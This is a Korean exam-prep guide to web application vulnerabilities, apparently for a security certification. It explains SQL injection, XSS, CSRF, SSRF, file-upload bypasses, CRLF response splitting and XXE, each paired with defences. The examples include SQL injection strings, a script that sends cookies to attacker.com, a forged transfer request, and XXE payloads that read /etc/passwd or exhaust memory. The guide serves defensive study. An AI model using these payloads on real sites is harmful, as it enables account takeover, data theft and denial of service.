@@ -1,0 +1,247 @@
+> 섹션 08은 SQL Injection, XSS, CSRF, SSRF, 파일 업로드 취약점, HTTP Response Splitting, XXE 등 OWASP Top 10에 포함된 공격들이 매 시험에서 공격 원리 + 공격 흐름 + 대응 방법 3가지 세트로 출제되는 최핵심 영역입니다.
+
+## 1. 개념 및 배경
+
+웹 애플리케이션 취약점은 입력값 검증 미흡이 근본 원인입니다. 공격자는 정상적인 HTTP 요청에 악성 코드나 조작된 입력을 삽입하여 DB 탈취, 스크립트 실행, 권한 우회, 내부 서버 접근 등의 피해를 유발합니다.
+
+## 2. 동작 원리 / 구조
+
+### 💉 SQL Injection
+
+웹 폼 입력값이 SQL 쿼리에 그대로 삽입될 때 발생합니다.
+
+**SQL Injection 유형 5가지**
+
+| 유형 | 원리 | 예시 |
+|------|------|------|
+| Form SQL Injection | 로그인 폼 등에 SQL 조건 삽입 | `' OR 1=1 --` |
+| Union SQL Injection | UNION SELECT로 다른 테이블 조회 | `' UNION SELECT id,pw FROM admin --` |
+| Stored Procedure Injection | DBMS 내장 프로시저 악용 | `xp_cmdshell` (MS-SQL) |
+| Mass SQL Injection | DB 전체 테이블에 일괄 악성코드 삽입 | Bot 유포 목적 |
+| Blind SQL Injection | 에러 없이 참/거짓 응답으로 DB 구조 파악 | `AND 1=1`, `AND 1=2` 비교 |
+| Error-Based SQL Injection | 에러 메시지로 DB 정보 추출 | DB 구조 노출 |
+
+**Union SQL Injection 흐름**
+
+```text
+1. ORDER BY 1, 2, 3... 으로 컬럼 수 파악
+2. ORDER BY 4 → 에러 발생 → 컬럼 수 = 3
+3. UNION SELECT admin, admin, admin 으로 데이터 추출
+```
+
+**SQL Injection 대응**
+
+```java
+// ❌ 취약한 코드 (Statement 사용)
+String query = "SELECT * FROM member WHERE id='" + userId + "'";
+stmt.executeQuery(query);
+
+// ✅ 안전한 코드 (PreparedStatement 사용)
+String sql = "SELECT * FROM board WHERE b_gubun = ?";
+PreparedStatement pstmt = con.prepareStatement(sql);
+pstmt.setString(1, gubun);   // 입력값을 파라미터로 바인딩
+ResultSet rs = pstmt.executeQuery();
+```
+
+> 📌 Prepared Statement: SQL 구조와 데이터를 분리하여 입력값이 쿼리 구조를 변경할 수 없게 함
+
+**추가 대응 방법**
+
+- PHP: `magic_quotes_gpc = On`, `mysql_real_escape_string()`
+- PHP: `/etc/php.ini → display_errors = Off` (에러 메시지 비표시)
+- 최소 권한 DB 계정 사용
+
+### 🔴 XSS (Cross-Site Scripting)
+
+악성 스크립트를 웹 페이지에 삽입하여 다른 사용자의 브라우저에서 실행시키는 공격입니다.
+
+**XSS 유형 3가지 (시험 필수 암기!)**
+
+| 유형 | 저장 여부 | 원리 | 피해 |
+|------|-----------|------|------|
+| Stored XSS (저장형) | DB에 저장 | 게시판·댓글에 스크립트 삽입 → DB 저장 → 다른 사용자 조회 시 실행 | 쿠키 탈취, 악성코드 유포 |
+| Reflected XSS (반사형) | 저장 안 됨 | 조작된 URL을 피해자가 클릭 → 서버가 스크립트 포함 응답 반사 | 세션 탈취, 피싱 |
+| DOM based XSS | 저장 안 됨 | URL 파라미터가 DOM API(`document.write` 등)로 직접 HTML에 삽입 | 브라우저 내에서만 실행 |
+
+**Stored XSS 공격 흐름**
+
+```text
+1. 공격자가 게시판에 <script>document.location='http://attacker.com?c='+document.cookie</script> 삽입
+2. DB에 악성 스크립트 저장
+3. 피해자가 게시글 조회
+4. 브라우저에서 스크립트 실행 → 쿠키 탈취
+5. 공격자 서버로 쿠키 전송
+```
+
+**XSS 대응**
+
+- HttpOnly 속성: JavaScript의 `document.cookie` 접근 차단 → 쿠키 탈취 방어
+- 입력값 필터링: `<`, `>`, `"`, `'`, `&` 등 HTML 특수문자 인코딩(`&lt;`, `&gt;`)
+- Content Security Policy (CSP) 헤더 적용
+
+### 🎭 CSRF (Cross-Site Request Forgery)
+
+인증된 사용자를 이용하여 의도치 않은 요청을 서버에 전송하는 공격입니다.
+
+**CSRF 공격 흐름**
+
+```text
+1. 피해자가 정상 사이트(은행 등)에 로그인 (세션 유지)
+2. 공격자가 악성 사이트/이메일에 위조 요청 삽입
+   예: <img src="http://bank.com/transfer?to=attacker&amount=1000000">
+3. 피해자가 악성 링크 클릭/방문
+4. 브라우저가 세션 쿠키 포함하여 은행 서버에 요청 전송
+5. 서버는 정상 요청으로 인식하고 처리
+```
+
+**CSRF 대응**
+
+- CSRF Token: 서버가 발행한 랜덤 토큰을 폼에 삽입, 요청 시 검증
+- Referer 검증: 요청의 출처 URL 확인
+- SameSite 쿠키 속성 설정
+- CAPTCHA 적용
+
+> 📌 XSS vs CSRF 구분: XSS = 스크립트 삽입으로 다른 사용자 공격, CSRF = 인증된 사용자의 요청 위조
+
+### 🔄 SSRF (Server-Side Request Forgery)
+
+서버가 공격자가 지정한 URL로 요청을 보내도록 유도하는 공격입니다.
+
+**SSRF 공격 흐름**
+
+```text
+1. 웹 서버가 사용자 입력 URL로 HTTP 요청하는 기능 존재
+2. 공격자가 내부 서버 주소 입력 (예: http://192.168.1.1/admin)
+3. 웹 서버가 내부망으로 요청 전송 (방화벽 우회)
+4. 내부 서버 응답을 공격자가 수신
+```
+
+대응: URL 화이트리스트 적용, 내부 IP 대역 요청 차단
+
+### 📤 파일 업로드 취약점
+
+업로드된 파일이 서버에서 실행될 때 웹쉘(Web Shell) 설치로 이어집니다.
+
+**공격 우회 방법 3가지**
+
+1. 확장자 대소문자 우회: `test.PhP`, `test.PHP`
+2. 이중 확장자: `test.php.jpeg`, `test.jpeg.php`
+3. Null Byte 삽입: `test.php%00.jpeg` → 서버가 `.jpeg` 무시하고 `.php` 실행
+
+**대응**
+
+```apache
+# httpd.conf - 업로드 용량 제한
+LimitRequestBody 5000000
+
+# .htaccess - 확장자 필터링 (AddType)
+AddType text/html .php .php1 .php2 .phtml
+
+# .htaccess - 특정 확장자 실행 차단 (FilesMatch)
+<FilesMatch "\.ph|\.lib|\.sh">
+  Order Allow,DENY
+  Deny From ALL
+</FilesMatch>
+```
+
+### 🔀 HTTP Response Splitting
+
+HTTP 응답 헤더에 CR(`\r`, 0x0D)·LF(`\n`, 0x0A) 문자를 삽입하여 응답을 분할하는 공격입니다.
+
+**공격 원리**
+
+```text
+1. 공격자가 입력값에 CRLF(\r\n) 삽입
+   예: nickname = "admin\r\nSet-Cookie: sessionid=attacker"
+2. 서버가 Set-Cookie 헤더에 값을 그대로 삽입
+3. CRLF로 헤더가 분리되어 악성 헤더 삽입
+4. XSS, 세션 고정 공격 등으로 이어짐
+```
+
+대응: 입력값에서 `\r`, `\n` 문자 필터링 및 인코딩
+
+### 📄 XXE (XML eXternal Entity Injection)
+
+XML 파서가 외부 엔티티(Entity)를 처리할 때 파일 시스템 접근이나 DoS가 발생하는 취약점입니다.
+
+**공격 예시**
+
+```xml
+<!-- 파일 읽기 공격 -->
+<?xml version="1.0" encoding="ISO-8859-1"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
+
+<!-- Billion Laughs (DoS) 공격 -->
+<!DOCTYPE lols [
+  <!ENTITY lol "lol">
+  <!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">
+  <!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">
+  ...
+  <!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">
+]>
+<lols>&lol9;</lols>
+```
+
+대응: XML 파서에서 외부 엔티티 처리 비활성화 (`FEATURE_EXTERNAL_GENERAL_ENTITIES = false`)
+
+> 🔍 **보완**: XXE 대응의 가장 확실한 방법은 DTD(문서 형식 정의) 자체를 비활성화하는 것입니다. Java(JAXP) 기준 `factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true)`로 DOCTYPE 선언을 완전히 금지하면 외부 엔티티·파라미터 엔티티·Billion Laughs를 한 번에 차단할 수 있습니다. DTD가 필요한 경우에만 `external-general-entities`·`external-parameter-entities` 기능을 각각 false로 설정합니다. 이 외에 라이브러리 최신화, 서버 응답에서 상세 오류 미노출도 함께 권장됩니다.
+
+> 🔍 **보완**: Billion Laughs(엔티티 확장 DoS)는 엄밀히는 외부가 아닌 **내부 엔티티**의 재귀적 확장으로 메모리를 고갈시키는 공격입니다. 넓은 의미의 XML 파싱 취약점으로 XXE와 함께 묶어 출제되지만, 파일 읽기형 XXE(`SYSTEM "file://"`)와 원리가 다르다는 점을 구분해 답안에 쓰면 감점을 피할 수 있습니다.
+
+### 🌐 기타 주요 취약점
+
+| 취약점 | 핵심 개념 |
+|--------|-----------|
+| Path Traversal | `../../../etc/passwd`로 웹 루트 외부 파일 접근 |
+| LFI (Local File Inclusion) | `include()`, `require()`로 서버 내 파일 포함 실행 |
+| RFI (Remote File Inclusion) | 외부 URL 파일 포함 실행, `php.ini`의 `allow_url_fopen = Off`로 방어 |
+| OS Command Injection | 입력값에 `;`, `` ` `` 등 셸 메타문자를 삽입해 OS 명령 실행 |
+| XPath/XQuery Injection | XML DB 쿼리 조작, SQL Injection과 유사 |
+| HTTP Request Smuggling | `Content-Length`와 `Transfer-Encoding: chunked` 헤더 혼용으로 백엔드 서버에 요청 밀수 |
+
+## 3. 예시 / 적용 시나리오
+
+**기출 시나리오: SQL Injection Prepared Statement 변환**
+
+```java
+// 취약한 코드
+String sql = "SELECT * FROM board WHERE b_gubun = '" + gubun + "'";
+Statement stmt = con.createStatement();
+stmt.executeQuery(sql);
+
+// ✅ 수정 코드
+String sql = "SELECT * FROM board WHERE b_gubun = ?"; // A
+PreparedStatement pstmt = con.prepareStatement(sql); // B
+pstmt.setString(1, gubun);                            // C
+ResultSet rs = pstmt.executeQuery();                  // D
+```
+
+`A = ?` (플레이스홀더), `B = prepareStatement`, `C = setString`, `D = executeQuery`
+
+**기출 시나리오: XSS 유형 구분**
+
+"HTTP 요청·응답이 없는 조건에서 URL의 DOM 조작으로 발생하는 XSS는?"
+
+DOM based XSS — URL 파라미터가 서버를 거치지 않고 브라우저의 DOM API에 의해 직접 HTML에 삽입됩니다.
+
+## 4. 실무 및 시험 포인트 정리
+
+| 취약점 | 핵심 암기 내용 | 출제 빈도 |
+|--------|---------------|-----------|
+| SQL Injection 유형 | Form, Union, Stored Procedure, Mass, Blind, Error-Based | ⭐⭐⭐ |
+| Prepared Statement | SQL 구조와 데이터 분리, `?` 플레이스홀더 | ⭐⭐⭐ |
+| XSS 유형 3가지 | Stored(DB저장), Reflected(반사), DOM based | ⭐⭐⭐ |
+| XSS 대응 | HttpOnly(쿠키 보호), 입력값 HTML 인코딩 | ⭐⭐⭐ |
+| CSRF vs XSS 구분 | CSRF=요청 위조, XSS=스크립트 삽입 | ⭐⭐⭐ |
+| 파일 업로드 우회 3종 | 대소문자, 이중 확장자, Null Byte | ⭐⭐⭐ |
+| HTTP Response Splitting | CRLF 삽입, `\r\n` 필터링으로 대응 | ⭐⭐⭐ |
+| XXE 2가지 패턴 | 파일 읽기(`SYSTEM "file://"`), Billion Laughs(DoS) | ⭐⭐⭐ |
+| SSRF | 서버가 내부망에 요청, URL 화이트리스트 대응 | ⭐⭐ |
+| LFI vs RFI | LFI=로컬 파일, RFI=원격 URL, `allow_url_fopen=Off` | ⭐⭐ |
+| Union SQL Injection | ORDER BY로 컬럼 수 파악 후 UNION SELECT 실행 | ⭐⭐ |
+| HTTP Request Smuggling | Content-Length + Transfer-Encoding 헤더 충돌 악용 | ⭐⭐ |
+
+> 📌 서술형 고득점 전략: SQL Injection은 ① 공격 원리 → ② `OR 1=1` 조건 예시 → ③ Prepared Statement 대응 코드 3단계 구조로 답하세요. XSS는 유형별 저장 여부와 실행 경로의 차이를 명확히 구분하고, HttpOnly 속성의 방어 원리를 함께 기술하면 고득점입니다.
